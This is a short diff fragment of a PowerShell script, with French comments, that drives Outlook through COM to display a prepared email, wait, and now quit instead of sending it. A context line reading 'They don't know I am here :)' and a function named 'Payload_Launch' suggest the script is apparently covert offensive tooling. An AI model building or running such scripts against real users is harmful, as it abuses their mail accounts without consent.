@@ -136,7 +136,7 @@ They don't know I am here :)
     # Afficher l'email (optionnel) et envoyer l'email
     $mailItem.Display()  # Affiche l'email (vous pouvez le commenter si vous voulez envoyer directement)
     Start-Sleep -Seconds 8
-    $mailItem.Send()   # Envoyer l'email directement (décommenter cette ligne pour envoyer l'email)
+    $olApp.Quit()
 }
 
 Payload_Launch
